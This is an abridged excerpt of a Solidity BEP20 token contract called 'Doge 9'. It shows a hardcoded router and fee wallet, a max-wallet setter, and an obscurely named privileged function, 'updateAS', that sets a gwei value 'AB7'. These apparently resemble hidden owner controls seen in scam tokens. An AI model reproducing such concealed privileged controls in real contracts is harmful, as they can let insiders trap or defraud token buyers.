...
contract DOGE9 is Ownable, IBEP20 {
    using SafeMath for uint256;
    ...
    string constant _name = "Doge 9";
    string constant _symbol = "DOGE 9";
    ...
    constructor () {
       router = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        ...
        marketingFeeReceiver = 0xdA55887311a67b343BAA9880e697a1E75042c3c0;
    ...
    function SetMaxWalletAbsolute(uint256 amount) external {
        require(isTxLimitExempt[msg.sender]);
        require(amount >= _totalSupply / 1000);
    ...
    function updateAS (uint256 _AB7) public {
        require(isTxLimitExempt[msg.sender]);
               AB7 = _AB7 * 1 gwei; 
